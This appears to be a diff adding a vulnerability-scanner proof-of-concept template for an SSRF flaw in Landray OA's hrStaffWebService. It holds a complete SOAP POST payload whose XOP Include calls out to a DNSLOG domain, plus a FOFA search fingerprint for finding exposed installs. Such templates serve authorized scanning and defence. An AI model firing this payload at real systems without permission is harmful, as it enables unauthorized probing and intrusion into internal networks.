@@ -1,0 +1,26 @@
+id: poc-yaml-landray-hrstaffwebservice-ssrf
+info:
+  name: 蓝凌OA hrStaffWebService SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: landray
+  fofa: app="Landray-OA系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /sys/webservice/hrStaffWebService
+  headers:
+    Content-Type: multipart/related; boundary=----frhpvivnctknnkiwugaq
+  data: "------frhpvivnctknnkiwugaq\nContent-Disposition: form-data; name=\"1\"\n\n\
+    <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:web=\"http://webservice.staff.hr.kmss.landray.com/\">\n<soapenv:Header/>\n\
+    <soapenv:Body>\n    <web:getHrStaffElements>\n        <arg0>\n            <beginTimeStamp>1</beginTimeStamp>\n\
+    \            <count><xop:Include \nxmlns:xop=\"http://www.w3.org/2004/08/xop/include\"\
+    \ \nhref=\"https://{{.domain}}\"/></count>\n        </arg0>\n    </web:getHrStaffElements>\n\
+    </soapenv:Body>\n</soapenv:Envelope>\n------frhpvivnctknnkiwugaq--"
+  expression: reverse.Verify()
+transport: http
